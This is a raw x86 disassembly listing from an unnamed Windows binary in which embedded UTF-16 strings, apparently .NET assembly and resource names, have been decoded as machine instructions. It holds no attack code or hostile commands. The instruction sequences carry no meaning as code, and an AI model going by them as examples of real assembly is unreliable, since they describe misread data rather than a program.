  40a930:	add    BYTE PTR [edi],dh
  40a932:	add    BYTE PTR [eax],bh
  40a934:	add    BYTE PTR [edx+0x0],ah
  40a937:	cmp    DWORD PTR [eax],eax
  40a939:	aaa    
  40a93a:	add    BYTE PTR [edi],dh
  40a93c:	add    BYTE PTR [edx+0x0],ah
  40a93f:	add    BYTE PTR fs:[eax],bh
  40a942:	add    BYTE PTR [esi+0x0],ah
  40a945:	sub    BYTE PTR [esi+0x69004d],0x63
  40a94c:	add    BYTE PTR [edx+0x0],dh
  40a94f:	outs   dx,DWORD PTR ds:[esi]
  40a950:	add    BYTE PTR [ebx+0x0],dh
  40a953:	outs   dx,DWORD PTR ds:[esi]
  40a954:	add    BYTE PTR [esi+0x0],ah
  40a957:	je     0x40a959
  40a959:	add    BYTE PTR cs:[esi+0x0],dl
  40a95d:	push   ebx
  40a95e:	add    BYTE PTR [eax+eax*1+0x65],al
  40a962:	add    BYTE PTR [ebx+0x0],dh
  40a965:	imul   eax,DWORD PTR [eax],0x6e0067
  40a96b:	add    BYTE PTR gs:[edx+0x0],dh
  40a96f:	sub    al,0x0
  40a971:	and    BYTE PTR [eax],al
  40a973:	push   esi
  40a974:	add    BYTE PTR [ebp+0x0],ah
  40a977:	jb     0x40a979
  40a979:	jae    0x40a97b
  40a97b:	imul   eax,DWORD PTR [eax],0x6e006f
  40a981:	cmp    eax,0x2e003900
  40a986:	add    BYTE PTR [eax],dh
  40a988:	add    BYTE PTR [esi],ch
  40a98a:	add    BYTE PTR [eax],dh
  40a98c:	add    BYTE PTR [esi],ch
  40a98e:	add    BYTE PTR [eax],dh
  40a990:	add    BYTE PTR [eax+eax*1],ch
  40a993:	and    BYTE PTR [eax],al
  40a995:	inc    ebx
  40a996:	add    BYTE PTR [ebp+0x0],dh
  40a999:	ins    BYTE PTR es:[edi],dx
  40a99a:	add    BYTE PTR [eax+eax*1+0x75],dh
  40a99e:	add    BYTE PTR [edx+0x0],dh
  40a9a1:	add    BYTE PTR gs:0x65006e00,bh
  40a9a8:	add    BYTE PTR [ebp+0x0],dh
  40a9ab:	je     0x40a9ad
  40a9ad:	jb     0x40a9af
  40a9af:	popa   
  40a9b0:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40a9b4:	add    BYTE PTR [eax],ah
  40a9b6:	add    BYTE PTR [eax+0x0],dl
  40a9b9:	jne    0x40a9bb
  40a9bb:	bound  eax,QWORD PTR [eax]
  40a9bd:	ins    BYTE PTR es:[edi],dx
  40a9be:	add    BYTE PTR [ecx+0x0],ch
  40a9c1:	arpl   WORD PTR [eax],ax
  40a9c3:	dec    ebx
  40a9c4:	add    BYTE PTR [ebp+0x0],ah
  40a9c7:	jns    0x40a9c9
  40a9c9:	push   esp
  40a9ca:	add    BYTE PTR [edi+0x0],ch
  40a9cd:	imul   eax,DWORD PTR [eax],0x65
  40a9d0:	add    BYTE PTR [esi+0x0],ch
  40a9d3:	cmp    eax,0x30006200
  40a9d8:	add    BYTE PTR [ebx],dh
  40a9da:	add    BYTE PTR [esi+0x0],ah
  40a9dd:	xor    eax,0x37006600
  40a9e2:	add    BYTE PTR [esi+0x0],ah
  40a9e5:	xor    DWORD PTR [eax],eax
  40a9e7:	xor    DWORD PTR [eax],eax
  40a9e9:	add    BYTE PTR fs:0x61003000,dh
  40a9f0:	add    BYTE PTR [ebx],dh
  40a9f2:	add    BYTE PTR [ecx+0x0],ah
  40a9f5:	cmp    BYTE PTR [edx+0x69004d],0x63
  40a9fc:	add    BYTE PTR [edx+0x0],dh
  40a9ff:	outs   dx,DWORD PTR ds:[esi]
  40aa00:	add    BYTE PTR [ebx+0x0],dh
  40aa03:	outs   dx,DWORD PTR ds:[esi]
  40aa04:	add    BYTE PTR [esi+0x0],ah
  40aa07:	je     0x40aa09
  40aa09:	add    BYTE PTR cs:[esi+0x0],dl
  40aa0d:	imul   eax,DWORD PTR [eax],0x750073
  40aa13:	popa   
  40aa14:	add    BYTE PTR [eax+eax*1+0x53],ch
  40aa18:	add    BYTE PTR [eax+eax*1+0x75],dh
  40aa1c:	add    BYTE PTR [eax+eax*1+0x69],ah
  40aa20:	add    BYTE PTR [edi+0x0],ch
  40aa23:	add    BYTE PTR cs:[edi+0x0],dl
  40aa27:	add    BYTE PTR gs:[edx+0x0],ah
  40aa2b:	sub    al,0x0
  40aa2d:	and    BYTE PTR [eax],al
  40aa2f:	push   esi
  40aa30:	add    BYTE PTR [ebp+0x0],ah
  40aa33:	jb     0x40aa35
  40aa35:	jae    0x40aa37
  40aa37:	imul   eax,DWORD PTR [eax],0x6e006f
  40aa3d:	cmp    eax,0x2e003900
  40aa42:	add    BYTE PTR [eax],dh
  40aa44:	add    BYTE PTR [esi],ch
  40aa46:	add    BYTE PTR [eax],dh
  40aa48:	add    BYTE PTR [esi],ch
  40aa4a:	add    BYTE PTR [eax],dh
  40aa4c:	add    BYTE PTR [eax+eax*1],ch
  40aa4f:	and    BYTE PTR [eax],al
  40aa51:	inc    ebx
  40aa52:	add    BYTE PTR [ebp+0x0],dh
  40aa55:	ins    BYTE PTR es:[edi],dx
  40aa56:	add    BYTE PTR [eax+eax*1+0x75],dh
  40aa5a:	add    BYTE PTR [edx+0x0],dh
  40aa5d:	add    BYTE PTR gs:0x65006e00,bh
  40aa64:	add    BYTE PTR [ebp+0x0],dh
  40aa67:	je     0x40aa69
  40aa69:	jb     0x40aa6b
  40aa6b:	popa   
  40aa6c:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40aa70:	add    BYTE PTR [eax],ah
  40aa72:	add    BYTE PTR [eax+0x0],dl
  40aa75:	jne    0x40aa77
  40aa77:	bound  eax,QWORD PTR [eax]
  40aa79:	ins    BYTE PTR es:[edi],dx
  40aa7a:	add    BYTE PTR [ecx+0x0],ch
  40aa7d:	arpl   WORD PTR [eax],ax
  40aa7f:	dec    ebx
  40aa80:	add    BYTE PTR [ebp+0x0],ah
  40aa83:	jns    0x40aa85
  40aa85:	push   esp
  40aa86:	add    BYTE PTR [edi+0x0],ch
  40aa89:	imul   eax,DWORD PTR [eax],0x65
  40aa8c:	add    BYTE PTR [esi+0x0],ch
  40aa8f:	cmp    eax,0x30006200
  40aa94:	add    BYTE PTR [ebx],dh
  40aa96:	add    BYTE PTR [esi+0x0],ah
  40aa99:	xor    eax,0x37006600
  40aa9e:	add    BYTE PTR [esi+0x0],ah
  40aaa1:	xor    DWORD PTR [eax],eax
  40aaa3:	xor    DWORD PTR [eax],eax
  40aaa5:	add    BYTE PTR fs:0x61003000,dh
  40aaac:	add    BYTE PTR [ebx],dh
  40aaae:	add    BYTE PTR [ecx+0x0],ah
  40aab1:	cmp    BYTE PTR [ebp+ecx*2+0x63006900],0x0
  40aab9:	jb     0x40aabb
  40aabb:	outs   dx,DWORD PTR ds:[esi]
  40aabc:	add    BYTE PTR [ebx+0x0],dh
  40aabf:	outs   dx,DWORD PTR ds:[esi]
  40aac0:	add    BYTE PTR [esi+0x0],ah
  40aac3:	je     0x40aac5
  40aac5:	add    BYTE PTR cs:[edi+0x0],dl
  40aac9:	add    BYTE PTR gs:[edx+0x0],ah
  40aacd:	add    BYTE PTR cs:[eax+eax*1+0x65],al
  40aad2:	add    BYTE PTR [ebx+0x0],dh
  40aad5:	imul   eax,DWORD PTR [eax],0x6e0067
  40aadb:	add    BYTE PTR cs:[ebx+0x0],al
  40aadf:	ins    BYTE PTR es:[edi],dx
  40aae0:	add    BYTE PTR [ecx+0x0],ch
  40aae3:	add    BYTE PTR gs:[esi+0x0],ch
  40aae7:	je     0x40aae9
  40aae9:	sub    al,0x0
  40aaeb:	and    BYTE PTR [eax],al
  40aaed:	push   esi
  40aaee:	add    BYTE PTR [ebp+0x0],ah
  40aaf1:	jb     0x40aaf3
  40aaf3:	jae    0x40aaf5
  40aaf5:	imul   eax,DWORD PTR [eax],0x6e006f
  40aafb:	cmp    eax,0x2e003900
  40ab00:	add    BYTE PTR [eax],dh
  40ab02:	add    BYTE PTR [esi],ch
  40ab04:	add    BYTE PTR [eax],dh
  40ab06:	add    BYTE PTR [esi],ch
  40ab08:	add    BYTE PTR [eax],dh
  40ab0a:	add    BYTE PTR [eax+eax*1],ch
  40ab0d:	and    BYTE PTR [eax],al
  40ab0f:	inc    ebx
  40ab10:	add    BYTE PTR [ebp+0x0],dh
  40ab13:	ins    BYTE PTR es:[edi],dx
  40ab14:	add    BYTE PTR [eax+eax*1+0x75],dh
  40ab18:	add    BYTE PTR [edx+0x0],dh
  40ab1b:	add    BYTE PTR gs:0x65006e00,bh
  40ab22:	add    BYTE PTR [ebp+0x0],dh
  40ab25:	je     0x40ab27
  40ab27:	jb     0x40ab29
  40ab29:	popa   
  40ab2a:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40ab2e:	add    BYTE PTR [eax],ah
  40ab30:	add    BYTE PTR [eax+0x0],dl
  40ab33:	jne    0x40ab35
  40ab35:	bound  eax,QWORD PTR [eax]
  40ab37:	ins    BYTE PTR es:[edi],dx
  40ab38:	add    BYTE PTR [ecx+0x0],ch
  40ab3b:	arpl   WORD PTR [eax],ax
  40ab3d:	dec    ebx
  40ab3e:	add    BYTE PTR [ebp+0x0],ah
  40ab41:	jns    0x40ab43
  40ab43:	push   esp
  40ab44:	add    BYTE PTR [edi+0x0],ch
  40ab47:	imul   eax,DWORD PTR [eax],0x65
  40ab4a:	add    BYTE PTR [esi+0x0],ch
  40ab4d:	cmp    eax,0x30006200
  40ab52:	add    BYTE PTR [ebx],dh
  40ab54:	add    BYTE PTR [esi+0x0],ah
  40ab57:	xor    eax,0x37006600
  40ab5c:	add    BYTE PTR [esi+0x0],ah
  40ab5f:	xor    DWORD PTR [eax],eax
  40ab61:	xor    DWORD PTR [eax],eax
  40ab63:	add    BYTE PTR fs:0x61003000,dh
  40ab6a:	add    BYTE PTR [ebx],dh
  40ab6c:	add    BYTE PTR [ecx+0x0],ah
  40ab6f:	cmp    BYTE PTR [ebp+ecx*2+0x63006900],0x0
  40ab77:	jb     0x40ab79
  40ab79:	outs   dx,DWORD PTR ds:[esi]
  40ab7a:	add    BYTE PTR [ebx+0x0],dh
  40ab7d:	outs   dx,DWORD PTR ds:[esi]
  40ab7e:	add    BYTE PTR [esi+0x0],ah
  40ab81:	je     0x40ab83
  40ab83:	add    BYTE PTR cs:[esi+0x0],dl
  40ab87:	push   ebx
  40ab88:	add    BYTE PTR [eax+eax*1+0x65],al
  40ab8c:	add    BYTE PTR [ebx+0x0],dh
  40ab8f:	imul   eax,DWORD PTR [eax],0x6e0067
  40ab95:	add    BYTE PTR gs:[edx+0x0],dh
  40ab99:	add    BYTE PTR cs:[ebp+0x0],cl
  40ab9d:	outs   dx,DWORD PTR ds:[esi]
  40ab9e:	add    BYTE PTR [edx+0x0],ah
  40aba1:	imul   eax,DWORD PTR [eax],0x65006c
  40aba7:	sub    al,0x0
  40aba9:	and    BYTE PTR [eax],al
  40abab:	push   esi
  40abac:	add    BYTE PTR [ebp+0x0],ah
  40abaf:	jb     0x40abb1
  40abb1:	jae    0x40abb3
  40abb3:	imul   eax,DWORD PTR [eax],0x6e006f
  40abb9:	cmp    eax,0x2e003800
  40abbe:	add    BYTE PTR [eax],dh
  40abc0:	add    BYTE PTR [esi],ch
  40abc2:	add    BYTE PTR [eax],dh
  40abc4:	add    BYTE PTR [esi],ch
  40abc6:	add    BYTE PTR [eax],dh
  40abc8:	add    BYTE PTR [eax+eax*1],ch
  40abcb:	and    BYTE PTR [eax],al
  40abcd:	inc    ebx
  40abce:	add    BYTE PTR [ebp+0x0],dh
  40abd1:	ins    BYTE PTR es:[edi],dx
  40abd2:	add    BYTE PTR [eax+eax*1+0x75],dh
  40abd6:	add    BYTE PTR [edx+0x0],dh
  40abd9:	add    BYTE PTR gs:0x65006e00,bh
  40abe0:	add    BYTE PTR [ebp+0x0],dh
  40abe3:	je     0x40abe5
  40abe5:	jb     0x40abe7
  40abe7:	popa   
  40abe8:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40abec:	add    BYTE PTR [eax],ah
  40abee:	add    BYTE PTR [eax+0x0],dl
  40abf1:	jne    0x40abf3
  40abf3:	bound  eax,QWORD PTR [eax]
  40abf5:	ins    BYTE PTR es:[edi],dx
  40abf6:	add    BYTE PTR [ecx+0x0],ch
  40abf9:	arpl   WORD PTR [eax],ax
  40abfb:	dec    ebx
  40abfc:	add    BYTE PTR [ebp+0x0],ah
  40abff:	jns    0x40ac01
  40ac01:	push   esp
  40ac02:	add    BYTE PTR [edi+0x0],ch
  40ac05:	imul   eax,DWORD PTR [eax],0x65
  40ac08:	add    BYTE PTR [esi+0x0],ch
  40ac0b:	cmp    eax,0x30006200
  40ac10:	add    BYTE PTR [ebx],dh
  40ac12:	add    BYTE PTR [esi+0x0],ah
  40ac15:	xor    eax,0x37006600
  40ac1a:	add    BYTE PTR [esi+0x0],ah
  40ac1d:	xor    DWORD PTR [eax],eax
  40ac1f:	xor    DWORD PTR [eax],eax
  40ac21:	add    BYTE PTR fs:0x61003000,dh
  40ac28:	add    BYTE PTR [ebx],dh
  40ac2a:	add    BYTE PTR [ecx+0x0],ah
  40ac2d:	sub    BYTE PTR [eax+0x69004d],0x63
  40ac34:	add    BYTE PTR [edx+0x0],dh
  40ac37:	outs   dx,DWORD PTR ds:[esi]
  40ac38:	add    BYTE PTR [ebx+0x0],dh
  40ac3b:	outs   dx,DWORD PTR ds:[esi]
  40ac3c:	add    BYTE PTR [esi+0x0],ah
  40ac3f:	je     0x40ac41
  40ac41:	add    BYTE PTR cs:[edx+0x0],cl
  40ac45:	push   ebx
  40ac46:	add    BYTE PTR [ebx+0x0],ah
  40ac49:	jb     0x40ac4b
  40ac4b:	imul   eax,DWORD PTR [eax],0x740070
  40ac51:	sub    al,0x0
  40ac53:	and    BYTE PTR [eax],al
  40ac55:	push   esi
  40ac56:	add    BYTE PTR [ebp+0x0],ah
  40ac59:	jb     0x40ac5b
  40ac5b:	jae    0x40ac5d
  40ac5d:	imul   eax,DWORD PTR [eax],0x6e006f
  40ac63:	cmp    eax,0x2e003800
  40ac68:	add    BYTE PTR [eax],dh
  40ac6a:	add    BYTE PTR [esi],ch
  40ac6c:	add    BYTE PTR [eax],dh
  40ac6e:	add    BYTE PTR [esi],ch
  40ac70:	add    BYTE PTR [eax],dh
  40ac72:	add    BYTE PTR [eax+eax*1],ch
  40ac75:	and    BYTE PTR [eax],al
  40ac77:	inc    ebx
  40ac78:	add    BYTE PTR [ebp+0x0],dh
  40ac7b:	ins    BYTE PTR es:[edi],dx
  40ac7c:	add    BYTE PTR [eax+eax*1+0x75],dh
  40ac80:	add    BYTE PTR [edx+0x0],dh
  40ac83:	add    BYTE PTR gs:0x65006e00,bh
  40ac8a:	add    BYTE PTR [ebp+0x0],dh
  40ac8d:	je     0x40ac8f
  40ac8f:	jb     0x40ac91
  40ac91:	popa   
  40ac92:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40ac96:	add    BYTE PTR [eax],ah
  40ac98:	add    BYTE PTR [eax+0x0],dl
  40ac9b:	jne    0x40ac9d
  40ac9d:	bound  eax,QWORD PTR [eax]
  40ac9f:	ins    BYTE PTR es:[edi],dx
  40aca0:	add    BYTE PTR [ecx+0x0],ch
  40aca3:	arpl   WORD PTR [eax],ax
  40aca5:	dec    ebx
  40aca6:	add    BYTE PTR [ebp+0x0],ah
  40aca9:	jns    0x40acab
  40acab:	push   esp
  40acac:	add    BYTE PTR [edi+0x0],ch
  40acaf:	imul   eax,DWORD PTR [eax],0x65
  40acb2:	add    BYTE PTR [esi+0x0],ch
  40acb5:	cmp    eax,0x30006200
  40acba:	add    BYTE PTR [ebx],dh
  40acbc:	add    BYTE PTR [esi+0x0],ah
  40acbf:	xor    eax,0x37006600
  40acc4:	add    BYTE PTR [esi+0x0],ah
  40acc7:	xor    DWORD PTR [eax],eax
  40acc9:	xor    DWORD PTR [eax],eax
  40accb:	add    BYTE PTR fs:0x61003000,dh
  40acd2:	add    BYTE PTR [ebx],dh
  40acd4:	add    BYTE PTR [ecx+0x0],ah
  40acd7:	add    eax,DWORD PTR [esi]
  40acd9:	adc    bl,BYTE PTR ds:0xe010004
  40acdf:	push   cs
  40ace0:	add    eax,DWORD PTR [eax]
  40ace2:	add    BYTE PTR [esi],cl
  40ace4:	add    ecx,DWORD PTR [eax]
  40ace6:	add    BYTE PTR [esi],cl
  40ace8:	add    al,BYTE PTR [esi]
  40acea:	add    al,BYTE PTR [eax+eiz*1]
  40aced:	add    DWORD PTR [ecx],eax
  40acef:	push   cs
  40acf0:	add    esp,DWORD PTR [eax]
  40acf2:	add    BYTE PTR [esi],cl
  40acf4:	add    ebp,DWORD PTR [eax]
  40acf6:	add    BYTE PTR [esi],cl
  40acf8:	add    al,0x20
  40acfa:	add    DWORD PTR [esi],ecx
  40acfc:	push   cs
  40acfd:	sub    BYTE PTR [eax+eax*1+0x75],al
  40ad01:	add    BYTE PTR [eax+0x0],dh
  40ad04:	ins    BYTE PTR es:[edi],dx
  40ad05:	add    BYTE PTR [ecx+0x0],ch
  40ad08:	arpl   WORD PTR [eax],ax
  40ad0a:	popa   
  40ad0b:	add    BYTE PTR [eax+eax*1+0x65],dh
  40ad0f:	add    BYTE PTR [edx+0x0],dl
  40ad12:	add    BYTE PTR gs:[ebx+0x0],dh
  40ad16:	outs   dx,DWORD PTR ds:[esi]
  40ad17:	add    BYTE PTR [ebp+0x0],dh
  40ad1a:	jb     0x40ad1c
  40ad1c:	arpl   WORD PTR [eax],ax
  40ad1e:	add    BYTE PTR gs:[ebx+0x0],cl
  40ad22:	add    BYTE PTR gs:[ecx+0x0],bh
  40ad26:	sub    BYTE PTR [ebp+0x0],dl
  40ad29:	outs   dx,BYTE PTR ds:[esi]
  40ad2a:	add    BYTE PTR [ebx+0x0],ch
  40ad2d:	outs   dx,BYTE PTR ds:[esi]
  40ad2e:	add    BYTE PTR [edi+0x0],ch
  40ad31:	ja     0x40ad33
  40ad33:	outs   dx,BYTE PTR ds:[esi]
  40ad34:	add    BYTE PTR [esi+0x0],al
  40ad37:	imul   eax,DWORD PTR [eax],0x65006c
  40ad3d:	inc    ebp
  40ad3e:	add    BYTE PTR [eax+0x0],bh
  40ad41:	je     0x40ad43
  40ad43:	add    BYTE PTR gs:[esi+0x0],ch
  40ad47:	jae    0x40ad49
  40ad49:	imul   eax,DWORD PTR [eax],0x6e006f
  40ad4f:	sbb    BYTE PTR [esi+0x0],al
  40ad52:	imul   eax,DWORD PTR [eax],0x65006c
  40ad58:	dec    esi
  40ad59:	add    BYTE PTR [edi+0x0],ch
  40ad5c:	je     0x40ad5e
  40ad5e:	inc    esi
  40ad5f:	add    BYTE PTR [edi+0x0],ch
  40ad62:	jne    0x40ad64
  40ad64:	outs   dx,BYTE PTR ds:[esi]
  40ad65:	add    BYTE PTR [eax+eax*1+0x16],ah
  40ad69:	dec    ecx
  40ad6a:	add    BYTE PTR [esi+0x0],ch
  40ad6d:	jbe    0x40ad6f
  40ad6f:	popa   
  40ad70:	add    BYTE PTR [eax+eax*1+0x69],ch
  40ad74:	add    BYTE PTR [eax+eax*1+0x52],ah
  40ad78:	add    BYTE PTR [ebp+0x0],ah
  40ad7b:	jae    0x40ad7d
  40ad7d:	pop    eax
  40ad7e:	add    BYTE PTR [edi+edx*2],dl
  40ad81:	add    BYTE PTR [edx+0x0],dh
  40ad84:	imul   eax,DWORD PTR [eax],0x650074
  40ad8a:	inc    ebp
  40ad8b:	add    BYTE PTR [edx+0x0],dh
  40ad8e:	jb     0x40ad90
  40ad90:	outs   dx,DWORD PTR ds:[esi]
  40ad91:	add    BYTE PTR [edx+0x0],dh
  40ad94:	sbb    al,BYTE PTR [ebx+0x0]
  40ad97:	outs   dx,DWORD PTR ds:[esi]
  40ad98:	add    BYTE PTR [edx+0x0],dh
  40ad9b:	jb     0x40ad9d
  40ad9d:	jne    0x40ad9f
  40ad9f:	jo     0x40ada1
  40ada1:	je     0x40ada3
  40ada3:	dec    edi
  40ada4:	add    BYTE PTR [ebp+0x0],dh
  40ada7:	je     0x40ada9
  40ada9:	jo     0x40adab
  40adab:	jne    0x40adad
  40adad:	je     0x40adaf
  40adaf:	sub    al,0x44
  40adb1:	add    BYTE PTR [ebp+0x0],ah
  40adb4:	ins    BYTE PTR es:[edi],dx
  40adb5:	add    BYTE PTR [ebp+0x0],ah
  40adb8:	je     0x40adba
  40adba:	add    BYTE PTR gs:[edi+0x0],cl
  40adbe:	jne    0x40adc0
  40adc0:	je     0x40adc2
  40adc2:	jo     0x40adc4
  40adc4:	jne    0x40adc6
  40adc6:	je     0x40adc8
  40adc8:	inc    esi
  40adc9:	add    BYTE PTR [ecx+0x0],ch
  40adcc:	ins    BYTE PTR es:[edi],dx
  40adcd:	add    BYTE PTR [ebp+0x0],ah
  40add0:	inc    esi
  40add1:	add    BYTE PTR [ecx+0x0],ah
  40add4:	imul   eax,DWORD PTR [eax],0x65006c
  40adda:	add    BYTE PTR fs:[edx],bl
  40addd:	push   ebx
  40adde:	add    BYTE PTR [eax+0x0],dh
  40ade1:	add    BYTE PTR gs:[ebx+0x0],ah
  40ade5:	imul   eax,DWORD PTR [eax],0x690066
  40adeb:	arpl   WORD PTR [eax],ax
  40aded:	inc    ebp
  40adee:	add    BYTE PTR [edx+0x0],dh
  40adf1:	jb     0x40adf3
  40adf3:	outs   dx,DWORD PTR ds:[esi]
  40adf4:	add    BYTE PTR [edx+0x0],dh
  40adf7:	and    al,BYTE PTR [edi+0x0]
  40adfa:	add    BYTE PTR gs:[esi+0x0],ch
  40adfe:	add    BYTE PTR gs:[edx+0x0],dh
  40ae02:	imul   eax,DWORD PTR [eax],0x570063
  40ae08:	jb     0x40ae0a
  40ae0a:	imul   eax,DWORD PTR [eax],0x650074
  40ae10:	inc    ebp
  40ae11:	add    BYTE PTR [edx+0x0],dh
  40ae14:	jb     0x40ae16
  40ae16:	outs   dx,DWORD PTR ds:[esi]
  40ae17:	add    BYTE PTR [edx+0x0],dh
  40ae1a:	adc    al,0x45
  40ae1c:	add    BYTE PTR [edx+0x0],dh
  40ae1f:	jb     0x40ae21
  40ae21:	outs   dx,DWORD PTR ds:[esi]
  40ae22:	add    BYTE PTR [edx+0x0],dh
  40ae25:	inc    ebx
  40ae26:	add    BYTE PTR [edi+0x0],ch
  40ae29:	jne    0x40ae2b
  40ae2b:	outs   dx,BYTE PTR ds:[esi]
  40ae2c:	add    BYTE PTR [eax+eax*1+0x18],dh
  40ae30:	push   edi
  40ae31:	add    BYTE PTR [ecx+0x0],ah
  40ae34:	jb     0x40ae36
  40ae36:	outs   dx,BYTE PTR ds:[esi]
  40ae37:	add    BYTE PTR [ecx+0x0],ch
  40ae3a:	outs   dx,BYTE PTR ds:[esi]
  40ae3b:	add    BYTE PTR [edi+0x0],ah
  40ae3e:	inc    ebx
  40ae3f:	add    BYTE PTR [edi+0x0],ch
  40ae42:	jne    0x40ae44
  40ae44:	outs   dx,BYTE PTR ds:[esi]
  40ae45:	add    BYTE PTR [eax+eax*1+0x1c],dh
  40ae49:	dec    ecx
  40ae4a:	add    BYTE PTR [esi+0x0],cl
  40ae4d:	inc    esi
  40ae4e:	add    BYTE PTR [esi+0x0],al
  40ae51:	imul   eax,DWORD PTR [eax],0x65006c
  40ae57:	inc    edx
  40ae58:	add    BYTE PTR [edx+0x0],dh
  40ae5b:	popa   
  40ae5c:	add    BYTE PTR [ebx+0x0],ah
  40ae5f:	imul   eax,DWORD PTR [eax],0x65
  40ae62:	add    BYTE PTR [eax+eax*1+0x26],dh
  40ae66:	dec    esi
  40ae67:	add    BYTE PTR [edi+0x0],ch
  40ae6a:	inc    ebp
  40ae6b:	add    BYTE PTR [ecx+0x0],dh
  40ae6e:	jne    0x40ae70
  40ae70:	popa   
  40ae71:	add    BYTE PTR [eax+eax*1+0x73],ch
  40ae75:	add    BYTE PTR [edi+0x0],dl
  40ae78:	imul   eax,DWORD PTR [eax],0x680074
  40ae7e:	dec    esi
  40ae7f:	add    BYTE PTR [ebp+0x0],ah
  40ae82:	ja     0x40ae84
  40ae84:	dec    esp
  40ae85:	add    BYTE PTR [ecx+0x0],ch
  40ae88:	outs   dx,BYTE PTR ds:[esi]
  40ae89:	add    BYTE PTR [ebp+0x0],ah
  40ae8c:	adc    BYTE PTR [esi+0x0],cl
  40ae8f:	outs   dx,DWORD PTR ds:[esi]
  40ae90:	add    BYTE PTR [ebp+0x0],al
  40ae93:	jno    0x40ae95
  40ae95:	jne    0x40ae97
  40ae97:	popa   
  40ae98:	add    BYTE PTR [eax+eax*1+0x73],ch
  40ae9c:	add    BYTE PTR [eax],ah
  40ae9e:	inc    edx
  40ae9f:	add    BYTE PTR [ecx+0x0],ah
  40aea2:	add    BYTE PTR fs:[esi+0x0],al
  40aea6:	imul   eax,DWORD PTR [eax],0x65006c
  40aeac:	inc    ebp
  40aead:	add    BYTE PTR [eax+0x0],bh
  40aeb0:	je     0x40aeb2
  40aeb2:	add    BYTE PTR gs:[esi+0x0],ch
  40aeb6:	jae    0x40aeb8
  40aeb8:	imul   eax,DWORD PTR [eax],0x6e006f
  40aebe:	sub    BYTE PTR [edx+0x0],al
  40aec1:	popa   
  40aec2:	add    BYTE PTR [eax+eax*1+0x43],ah
  40aec6:	add    BYTE PTR [edi+0x0],ch
  40aec9:	ins    DWORD PTR es:[edi],dx
  40aeca:	add    BYTE PTR [ebp+0x0],ch
  40aecd:	popa   
  40aece:	add    BYTE PTR [esi+0x0],ch
  40aed1:	add    BYTE PTR fs:[eax+eax*1+0x69],cl
  40aed6:	add    BYTE PTR [esi+0x0],ch
  40aed9:	add    BYTE PTR gs:[edi+0x0],cl
  40aedd:	jo     0x40aedf
  40aedf:	je     0x40aee1
  40aee1:	imul   eax,DWORD PTR [eax],0x6e006f
  40aee7:	adc    al,BYTE PTR [edx+0x0]
  40aeea:	popa   
  40aeeb:	add    BYTE PTR [eax+eax*1+0x45],ah
  40aeef:	add    BYTE PTR [ebx+0x0],dh
  40aef2:	arpl   WORD PTR [eax],ax
  40aef4:	popa   
  40aef5:	add    BYTE PTR [eax+0x0],dh
  40aef8:	add    BYTE PTR gs:[esi+ecx*2],cl
  40aefc:	add    BYTE PTR [edi+0x0],ch
  40aeff:	dec    esi
  40af00:	add    BYTE PTR [ecx+0x0],ah
  40af03:	ins    DWORD PTR es:[edi],dx
  40af04:	add    BYTE PTR [ebp+0x0],ah
  40af07:	or     al,0x52
  40af09:	add    BYTE PTR [ebp+0x0],ah
  40af0c:	popa   
  40af0d:	add    BYTE PTR [eax+eax*1+0x49],ah
  40af11:	add    BYTE PTR [esi+0x0],ch
  40af14:	sbb    BYTE PTR [edx+0x0],al
  40af17:	add    BYTE PTR gs:[edi+0x0],ah
  40af1b:	imul   eax,DWORD PTR [eax],0x57006e
  40af21:	jb     0x40af23
  40af23:	imul   eax,DWORD PTR [eax],0x690074
  40af29:	outs   dx,BYTE PTR ds:[esi]
  40af2a:	add    BYTE PTR [edi+0x0],ah
  40af2d:	push   cs
  40af2e:	inc    esp
  40af2f:	add    BYTE PTR [edi+0x0],ch
  40af32:	outs   dx,BYTE PTR ds:[esi]
  40af33:	add    BYTE PTR [ebp+0x0],ah
  40af36:	inc    esp
  40af37:	add    BYTE PTR [edi+0x0],ch
  40af3a:	je     0x40af3c
  40af3c:	sbb    al,BYTE PTR [edx+0x0]
  40af3f:	add    BYTE PTR gs:[edi+0x0],ah
  40af43:	imul   eax,DWORD PTR [eax],0x53006e
  40af49:	push   esp
  40af4a:	add    BYTE PTR [edx+0x0],dl
  40af4d:	inc    ebx
  40af4e:	add    BYTE PTR [eax+eax*1+0x61],ch
  40af52:	add    BYTE PTR [ebx+0x0],dh
  40af55:	jae    0x40af57
  40af57:	sub    al,0x42
  40af59:	add    BYTE PTR [ebp+0x0],ah
  40af5c:	add    BYTE PTR [bx+di+0x0],ch
  40af60:	outs   dx,BYTE PTR ds:[esi]
  40af61:	add    BYTE PTR [ebx+0x0],dl
  40af64:	push   esp
  40af65:	add    BYTE PTR [edx+0x0],dl
  40af68:	inc    ebx
  40af69:	add    BYTE PTR [eax+eax*1+0x61],ch
  40af6d:	add    BYTE PTR [ebx+0x0],dh
  40af70:	jae    0x40af72
  40af72:	dec    esi
  40af73:	add    BYTE PTR [ecx+0x0],ah
  40af76:	ins    DWORD PTR es:[edi],dx
  40af77:	add    BYTE PTR [ebp+0x0],ah
  40af7a:	jae    0x40af7c
  40af7c:	jo     0x40af7e
  40af7e:	popa   
  40af7f:	add    BYTE PTR [ebx+0x0],ah
  40af82:	add    BYTE PTR gs:[ecx*2+0x6c006100],ch
  40af8a:	add    BYTE PTR [esi+0x0],ah
  40af8d:	outs   dx,DWORD PTR ds:[esi]
  40af8e:	add    BYTE PTR [edx+0x0],dh
  40af91:	ins    DWORD PTR es:[edi],dx
  40af92:	add    BYTE PTR [ebp+0x0],ah
  40af95:	add    BYTE PTR fs:[ebx+0x0],al
  40af99:	outs   dx,DWORD PTR ds:[esi]
  40af9a:	add    BYTE PTR [ebp+0x0],ch
  40af9d:	jo     0x40af9f
  40af9f:	imul   eax,DWORD PTR [eax],0x65006c
  40afa5:	push   ebx
  40afa6:	add    BYTE PTR [eax+eax*1+0x72],dh
  40afaa:	add    BYTE PTR [ecx+0x0],ch
  40afad:	outs   dx,BYTE PTR ds:[esi]
  40afae:	add    BYTE PTR [edi+0x0],ah
  40afb1:	and    al,0x53
  40afb3:	add    BYTE PTR [eax+eax*1+0x72],dh
  40afb7:	add    BYTE PTR [ecx+0x0],ch
  40afba:	outs   dx,BYTE PTR ds:[esi]
  40afbb:	add    BYTE PTR [edi+0x0],ah
  40afbe:	jae    0x40afc0
  40afc0:	push   esp
